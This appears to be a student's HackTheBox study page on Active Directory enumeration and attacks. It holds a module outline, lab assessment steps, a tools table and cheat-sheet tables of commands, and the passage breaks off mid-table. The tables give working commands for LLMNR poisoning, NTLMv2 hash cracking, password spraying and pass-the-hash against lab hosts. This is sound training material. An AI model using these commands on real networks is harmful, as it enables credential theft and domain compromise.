+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Notes of Ertaoz Bregvadze
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    HackTheBox Materials
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="active-directory-enumerationattacks">Active Directory Enumeration/Attacks</h1>
+<ul>
+<li>Initial Enumeration</li>
+<li>Identifying Hosts
+    &gt; Wireshark, TcpDump, Responder, fping, Nmap, </li>
+<li>Identifying Users
+    &gt; Kerbrute, CrackMapExec</li>
+<li>Identifying Potential Vulnerabilities
+    &gt; Local Privilege Escalation</li>
+<li>Sniffing out a Foothold</li>
+<li>LLMNR/NBT-NS Poisoning - from Linux
+    &gt; Responder</li>
+<li>LLMNR/NBT-NS Poisoning - from Windows
+    &gt; Inveigh, C# Inveigh (InveighZero)</li>
+<li>Sighting In, Hunting For A User</li>
+<li>Enumerating the Password Policy - from Linux<ul>
+<li>Enumerating the Password Policy - from Linux - SMB NULL Sessions<blockquote>
+<p>CrackMapExec, rpcclient, enum4linux</p>
+</blockquote>
+</li>
+<li>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind<blockquote>
+<p>ldapsearch, windapsearch</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Enumerating the Password Policy - from Windows
+    &gt; net.exe, PowerView</li>
+<li>Password Spraying - Making a Target User List<ul>
+<li>SMB NULL Session to Pull User List<blockquote>
+<p>enum4linux, rpcclient, CrackMapExec</p>
+</blockquote>
+</li>
+<li>Gathering Users with LDAP Anonymous<blockquote>
+<p>ldapsearch, windapsearch</p>
+</blockquote>
+</li>
+<li>Enumerating Users with Kerbrute<blockquote>
+<p>kerbrute</p>
+</blockquote>
+</li>
+<li>Credentialed Enumeration to Build our User List<blockquote>
+<p>CrackMapexec</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Spray Responsibly</li>
+<li>Internal Password Spraying - from Linux
+    &gt; kerbrute, rpcclient, Crackmapexec</li>
+<li>Internal Password Spraying - from Windows
+    &gt; DomainPasswordSpray.ps1</li>
+<li>Deeper Down the Rabbit Hole</li>
+<li>Enumerating Security Controls
+    &gt; LAPSToolkit, PowerShell</li>
+<li>Credentialed Enumeration - from Linux
+    &gt; CrackMapExec, SMBMap, rpcclient, Impacket Toolkit, Windapsearch, Bloodhound</li>
+<li>Credentialed Enumeration - from Windows
+    &gt; PowerView, SharpView, Shares, Snaffler, SharpHound</li>
+<li>Living Off the Land<ul>
+<li>Harnessing PowerShell</li>
+<li>Checking Defenses</li>
+<li>Am I Alone?<blockquote>
+<p>qwinsta</p>
+</blockquote>
+</li>
+<li>Network Information<blockquote>
+<p>arp, netsh, route, ipconfig</p>
+</blockquote>
+</li>
+<li>Windows Management Instrumentation (WMI)<blockquote>
+<p>wmic</p>
+</blockquote>
+</li>
+<li>Net Commands<blockquote>
+<p>net.exe, net1.exe</p>
+</blockquote>
+</li>
+<li>Dsquery<blockquote>
+<p>C:\Windows\System32\dsquery.dll</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Cooking with Fire</li>
+<li>Kerberoasting - from Linux
+    &gt; GetUserSPNs.py</li>
+<li>Kerberoasting - from Windows
+    &gt; setspn, Mimikatz, PowerView, Rubeus</li>
+<li>An ACE in the Hole</li>
+<li>Enumerating ACLs with PowerView</li>
+<li>Enumerating ACLs with BloodHound</li>
+<li>DCSync
+    &gt; secretsdump.py, Mimikatz</li>
+<li>Stacking The Deck</li>
+<li>Privileged Access<ul>
+<li>Remote Desktop<blockquote>
+<p>RDP</p>
+</blockquote>
+</li>
+<li>WinRM<blockquote>
+<p>PowerView, Evil-WinRM</p>
+</blockquote>
+</li>
+<li>SQL Server Admin<blockquote>
+<p>PowerUpSQL, mssqlclient.py</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Kerberos "Double Hop" Problem</li>
+<li>Bleeding Edge Vulnerabilities<ul>
+<li>NoPac (SamAccountName Spoofing)<blockquote>
+<p><a href="https://github.com/Ridter/noPac">NoPac</a></p>
+</blockquote>
+</li>
+<li>PrintNightmare<blockquote>
+<p><a href="https://github.com/cube0x0/CVE-2021-1675.git">PrintNightmare</a></p>
+</blockquote>
+</li>
+<li>PetitPotam (MS-EFSRPC)<blockquote>
+<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>Miscellaneous Misconfigurations<ul>
+<li>Exchange Related Group Membership</li>
+<li>PrivExchange</li>
+<li>Printer Bug</li>
+<li>Sniffing LDAP Credentials</li>
+<li>Enumerating DNS Records<blockquote>
+<p>adidnsdump</p>
+</blockquote>
+</li>
+<li>Password in Description Field</li>
+<li>PASSWD_NOTREQD Field</li>
+<li>Group Policy Preferences (GPP) Passwords</li>
+<li>ASREPRoasting<blockquote>
+<p>Rubeus, Kerbrute</p>
+</blockquote>
+</li>
+<li>Group Policy Object (GPO) Abuse</li>
+</ul>
+</li>
+<li>Why So Trusting?</li>
+<li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Windows
+    &gt; Mimikatz, PowerView, Rubeus</li>
+<li>Attacking Domain Trusts - Child -&gt; Parent Trusts - from Linux
+    &gt; secretsdump.py, lookupsid.py, ticketer.py, psexec.py, raiseChild.py</li>
+<li>Breaking Down Boundaries</li>
+<li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows<ul>
+<li>Cross-Forest Kerberoasting<blockquote>
+<p>Rubeus, PoweView</p>
+</blockquote>
+</li>
+<li>Admin Password Re-Use &amp; Group Membership<blockquote>
+<p>PoweView</p>
+</blockquote>
+</li>
+<li>SID History Abuse - Cross Forest</li>
+</ul>
+</li>
+<li>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux<ul>
+<li>Cross-Forest Kerberoasting<blockquote>
+<p>GetUserSPNs.py</p>
+</blockquote>
+</li>
+<li>Hunting Foreign Group Membership with Bloodhound-python<blockquote>
+<p>bloodhound-python</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h3 id="ad-enumeration-attacks-skills-assessment-part-i">AD Enumeration &amp; Attacks - Skills Assessment Part I</h3>
+<ol>
+<li>Perform Kerberoasting attack to obtain TGS hashes of SPN users</li>
+<li>Crack TGS hash of <code>svc_sql</code> user</li>
+<li>Use Chisel for tunneling.</li>
+<li>Use Xfreerdp to login on MS01 host using <code>svc_sql</code> credentials</li>
+<li>Run Mimikatz on MS01 host to obtain cleartext password of <code>tpetty</code> user</li>
+<li>Perform DCsync attack with <code>tpetty</code> user credentials using secretsdump.py to obtain NTLM hashes of AD users.</li>
+</ol>
+<h3 id="ad-enumeration-attacks-skills-assessment-part-ii">AD Enumeration &amp; Attacks - Skills Assessment Part II</h3>
+<ol>
+<li>Obtain NTLMv2 Hash of <code>AB920</code> user with Responder</li>
+<li>Crack it and login on <code>MS01</code> host with captured credentials using Evil-winrm</li>
+<li>Perform credentialed enumeration and obtain full  list of AD users with crackmapexec</li>
+<li>Perform Password spray attack with "Welcome1" password to obtain <code>BR086</code> account</li>
+<li>Enumerate domain controller shares with <code>BR086</code> account using smbmap to obtain database credentials</li>
+<li>Login on <code>SQL01</code> host with obtained database credentials using msqqlclient.py</li>
+<li>Privilege escalation with <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> on <code>SQL01</code> Host</li>
+<li>Obtain <code>Administrator</code> NTLM hash on <code>SQL01</code> host using CrackMapExec</li>
+<li>Use same <code>Administrator</code> NTLM hash to login on <code>MS01</code> host.</li>
+<li>Run inveigh on <code>MS01</code> host to capture <code>CT059</code> user NTLMv2 hash. </li>
+<li>Crack it and perform DCSync attack with <code>CT059</code> user credentials</li>
+<li>Use secretsdump.py to obtain NTLM hash of <code>KRBTGT</code> user.</li>
+</ol>
+<hr />
+<h2 id="tools-of-the-trade">Tools of the Trade</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>/<a href="https://github.com/dmchell/SharpView">SharpView</a></td>
+<td>A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows <code>net*</code> commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></td>
+<td>Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors">SharpHound</a> PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a <a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors">Neo4j</a> database for graphical analysis of the AD environment.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound</a></td>
+<td>The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/fox-it/BloodHound.py">BloodHound.py</a></td>
+<td>A Python-based BloodHound ingestor based on the <a href="https://github.com/CoreSecurity/impacket/">Impacket toolkit</a>. It supports most BloodHound collection methods and can be run from a non-domain joined attack box. The output can be ingested into the BloodHound GUI for analysis.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></td>
+<td>A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts and perform password spraying and brute forcing.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket">Impacket toolkit</a></td>
+<td>A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/lgandx/Responder">Responder</a></td>
+<td>Responder is a purpose built tool to poison LLMNR, NBT-NS and MDNS, with many different functions.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1">Inveigh.ps1</a></td>
+<td>Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh">C# Inveigh (InveighZero)</a></td>
+<td>The C# version of Inveigh with with a semi-interactive console for interacting with captured data such as username and password hashes.</td>
+</tr>
+<tr>
+<td><a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">rpcclient</a></td>
+<td>A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec (CME)</a></td>
+<td>CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols such as SMB, WMI, WinRM, and MSSQL.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></td>
+<td>Rubeus is a C# tool built for Kerberos Abuse.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a></td>
+<td>Another Impacket module geared towards finding Service Principal names tied to normal users.</td>
+</tr>
+<tr>
+<td><a href="https://hashcat.net/hashcat/">Hashcat</a></td>
+<td>A great hashcracking and password recovery tool.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/CiscoCXSecurity/enum4linux">enum4linux</a></td>
+<td>A tool for enumerating information from Windows and Samba systems.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a></td>
+<td>A rework of the original Enum4linux tool that works a bit differently.</td>
+</tr>
+<tr>
+<td><a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a></td>
+<td>Built in interface for interacting with the LDAP protocol.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ropnop/windapsearch">windapsearch</a></td>
+<td>A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray.ps1</a></td>
+<td>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a></td>
+<td>The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ShawnDEvans/smbmap">smbmap</a></td>
+<td>SMB share enumeration across a domain.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></td>
+<td>Part of the Impacket toolset, it provides us with psexec like functionality in the form of a semi-interactive shell.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></td>
+<td>Part of Impacket toolset, it provides the capability of command execution over WMI.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a></td>
+<td>Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a></td>
+<td>Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)">setspn.exe</a></td>
+<td>Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ParrotSec/mimikatz">Mimikatz</a></td>
+<td>Performs many functions. Noteably, pass-the-hash attacks, extracting plaintext passwords, and kerberos ticket extraction from memory on host.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a></td>
+<td>Remotely dump SAM and LSA secrets from a host.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a></td>
+<td>Provides us with an interactive shell on host over the WinRM protocol.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a></td>
+<td>Part of Impacket toolset, it provides the ability to interact with MSSQL databases.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Ridter/noPac">noPac.py</a></td>
+<td>Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">rpcdump.py</a></td>
+<td>Part of the Impacket toolset, RPC endpoint mapper.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py">CVE-2021-1675.py</a></td>
+<td>Printnightmare PoC in python.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx.py</a></td>
+<td>Part of the Impacket toolset, it performs SMB relay attacks.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/topotam/PetitPotam">PetitPotam.py</a></td>
+<td>PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py">gettgtpkinit.py</a></td>
+<td>Tool for manipulating certificates and TGTs.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py">getnthash.py</a></td>
+<td>This tool will use an existing TGT to request a PAC for the current user using U2U.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a></td>
+<td>A tool for enumeration and dumping of DNS records from a domain. Similar to performing a DNS Zone transfer.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/t0thkr1s/gpp-decrypt">gpp-decrypt</a></td>
+<td>Extracts usernames and passwords from Group Policy preferences.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">GetNPUsers.py</a></td>
+<td>Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py">lookupsid.py</a></td>
+<td>SID bruteforcing tool.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">ticketer.py</a></td>
+<td>A tool for creation and customization of TGT/TGS tickets.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py">raiseChild.py</a></td>
+<td>Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation.</td>
+</tr>
+<tr>
+<td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">Active Directory Explorer</a></td>
+<td>Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.</td>
+</tr>
+<tr>
+<td><a href="https://www.pingcastle.com/documentation/">PingCastle</a></td>
+<td>Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on <a href="https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration">CMMI</a> adapted to AD security).</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Group3r/Group3r">Group3r</a></td>
+<td>Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).</td>
+</tr>
+<tr>
+<td><a href="https://github.com/adrecon/ADRecon">ADRecon</a></td>
+<td>A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nslookup ns1.inlanefreight.com</code></td>
+<td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo tcpdump -i ens224</code></td>
+<td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo responder -I ens224 -A</code></td>
+<td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code>-I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td>
+</tr>
+<tr>
+<td><code>fping -asgq 172.16.5.0/23</code></td>
+<td>Performs a ping sweep on the specified network segment from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td>
+<td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td>
+</tr>
+<tr>
+<td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td>
+<td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>make help</code></td>
+<td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo make all</code></td>
+<td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td>
+</tr>
+<tr>
+<td><code>./kerbrute_linux_amd64</code></td>
+<td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td>
+<td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.</td>
+</tr>
+<tr>
+<td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td>
+<td>Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 -u anonymous -p "" --rid-brute 10000</code></td>
+<td>Used to Brute Force users with rids through crackmapexec anonymous login.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="llmnrntb-ns-poisoning">LLMNR/NTB-NS Poisoning</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>responder -h</code></td>
+<td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td>
+<td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\Inveigh.ps1</code></td>
+<td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td>
+</tr>
+<tr>
+<td><code>(Get-Command Invoke-Inveigh).Parameters</code></td>
+<td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td>
+<td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td>
+</tr>
+<tr>
+<td><code>.\Inveigh.exe</code></td>
+<td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}</code></td>
+<td>PowerShell script used to disable NBT-NS on a Windows host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="password-spraying-password-policies">Password Spraying &amp; Password Policies</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done</code></td>
+<td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td>
+<td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient -U "" -N 172.16.5.5</code></td>
+<td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient $&gt; querydominfo</code></td>
+<td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux  -P 172.16.5.5</code></td>
+<td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td>
+<td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td>
+</tr>
+<tr>
+<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength</code></td>
+<td>Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>net accounts</code></td>
+<td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\PowerView.ps1</code></td>
+<td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-DomainPolicy</code></td>
+<td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"</code></td>
+<td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>rpcclient -U "" -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td>
+<td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>crackmapexec smb 172.16.5.5 --users</code></td>
+<td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&amp;(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "</code></td>
+<td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U</code></td>
+<td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done</code></td>
+<td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td>
+</tr>
+<tr>
+<td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td>
+<td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +</code></td>
+<td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td>
+<td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td>
+</tr>
+<tr>
+<td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +</code></td>
+<td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td>
+</tr>
+<tr>
+<td><code>Import-Module .\DomainPasswordSpray.ps1</code></td>
+<td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td>
+<td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumerating-security-controls">Enumerating Security Controls</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-MpComputerStatus</code></td>
+<td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections</code></td>
+<td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td>
+</tr>
+<tr>
+<td><code>$ExecutionContext.SessionState.LanguageMode</code></td>
+<td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td>
+</tr>
+<tr>
